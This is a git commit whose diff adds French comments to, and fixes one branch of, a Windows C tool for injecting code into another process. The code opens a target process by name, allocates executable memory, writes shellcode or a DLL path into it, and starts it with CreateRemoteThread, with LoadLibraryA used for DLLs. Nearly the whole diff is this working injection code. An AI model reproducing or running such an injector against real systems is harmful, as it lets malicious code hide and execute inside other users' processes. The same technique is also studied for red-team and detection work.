6fbf29bd84f5ffe2b50b1b095ad5bc89ede995ee
0x41434142 <lucas.gaste@gmail.com>
2017-05-21 21:22:15 +0200

    Ajout des commentaires  et quelques modifications

--- main.c
+++ main.c
@@ -5,13 +5,22 @@
 #define SHELLCODE 0x01
 #define DLL 0x02
 
-
+/**
+ * Structure qui contient la taille du shellcode
+ * et le buffer contenant celui-ci
+ */
 typedef  struct MallocRes MallocRes;
 struct MallocRes {
     int size;
     char* buffer;
 };
 
+/**
+ * Affiche les erreurs
+ * @param hConsole
+ * @param saved_attributes
+ * @param msg
+ */
 void die(HANDLE hConsole,WORD saved_attributes , char* msg)
 {
     SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
@@ -19,6 +28,13 @@ void die(HANDLE hConsole,WORD saved_attributes , char* msg)
     SetConsoleTextAttribute(hConsole, saved_attributes);
 }
 
+/**
+ * Fonction qui charge le buffer dans le tas
+ * @param hConsole
+ * @param saved_attributes
+ * @param shellcodePath
+ * @return MallocRes
+ */
 MallocRes openFile(HANDLE hConsole, WORD saved_attributes, char* shellcodePath)
 {
     char* shellcodeFileMalloc = NULL;
@@ -61,6 +77,11 @@ MallocRes openFile(HANDLE hConsole, WORD saved_attributes, char* shellcodePath)
 
 }
 
+/**
+ * Retourne le pid
+ * @param process_name
+ * @return int
+ */
 int GetCalcPID(char* process_name)
 {
     int pid = 0;
@@ -84,9 +105,11 @@ int GetCalcPID(char* process_name)
     return pid;
 }
 
+
 int  main(int argc, char* argv[])
 {
     int kind;
+    DWORD oldProtect = 0;
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
     CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
     WORD saved_attributes;
@@ -96,23 +119,29 @@ int  main(int argc, char* argv[])
     char* shellcode;
     LPVOID addr = NULL;
     HANDLE threadID;
+    LPVOID AddressVirtualAlloc;
 
+    // < process_name.exe > < chemin vers dll ou shellcode > < dll | shellcode >
     if(argc <= 3)
     {
         die(hConsole, saved_attributes, "[!] No process, path or type given");
         exit(0);
     }
 
+    // si arg 3 = shellcode
     if(strcmp(argv[3], "shellcode") == 0)
     {
+        // On récupère le shellcode et sa taille
         MallocRes res = openFile(hConsole, saved_attributes, argv[2]);
         shellcode = res.buffer;
         size = res.size;
         kind = SHELLCODE;
         printf("======== SHELLCODE ========\n");
     }
-    else if(strcmp(argv[3], "shellcode") == 0)
+        // si arg 3 = DLL
+    else if(strcmp(argv[3], "dll") == 0)
     {
+        // On récupère la DLL
         shellcode = argv[2];
         size = (int)strlen(argv[2]);
         kind = DLL;
@@ -124,29 +153,29 @@ int  main(int argc, char* argv[])
         exit(0);
     }
 
-
+    // Si on ne parvient pas à ouvrir le shellcode
     if(shellcode == NULL || size == 0)
     {
         printf("[!] Problème lors de l'ouverture du shellcode ");
     }
     else
     {
-
+        // On récupère le PID
         int pid = GetCalcPID(argv[1]);
 
         if(pid != 0)
         {
             printf("[+] %s PID = %d\n", argv[1], pid);
+            // On récupère un handle sur le processus via sont ID
             HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-            LPVOID AddressVirtualAlloc;
 
-
-            if (hProcess)
+            if(hProcess)
             {
                 printf("[+] OpenProcess ... OK\n");
 
                 if(kind == DLL)
                 {
+                    // Si c'est une DLL on récupère l'adresse de la fonction LoadLibraryA dans kernel32.dll
                     addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                     if(addr != NULL)
                         printf("[+] GetProcAddress 0x%p\n", addr);
@@ -157,28 +186,32 @@ int  main(int argc, char* argv[])
                     }
                 }
 
+                // On alloue une page de mémoire de la taille du shellcode / path de la DLL et on récupère son adresse de début
                 AddressVirtualAlloc = VirtualAllocEx(hProcess, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-                if (AddressVirtualAlloc)
+                if(AddressVirtualAlloc)
                 {
                     printf("[+] Virtual Alloc ... 0x%p\n", AddressVirtualAlloc);
+                    // On écrit notre shellcode / path de dll au début de la page
                     if (WriteProcessMemory(hProcess, AddressVirtualAlloc, shellcode, size, NULL))
                     {
                         printf("[+] WriteProcessMemory %d bytes ... OK\n", size);
-                        DWORD oldProtect = 0;
+                        // On change la protection de la page
                         if (VirtualProtectEx(hProcess, AddressVirtualAlloc, size, PAGE_EXECUTE_READ, &oldProtect))
                         {
                             printf("[+] VirtualProtectEx ... OK\n");
                             if(kind == SHELLCODE)
                             {
+                                // On crée le thread dans le processus si c'est un shellcode
                                 threadID = CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE) AddressVirtualAlloc, NULL, NULL, NULL);
                             }
                             else
                             {
+                                // On crée le thread dans le processus si c'est une DLL
                                 threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) addr,  AddressVirtualAlloc, NULL, NULL);
                             }
                             if (threadID != NULL)
                             {
+                                // Tout est bon !d
                                 printf("[+] CreateRemoteThread ... OK\n");
                                 printf("[+] Thread ID %d\n", GetThreadId(threadID));
                                 SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
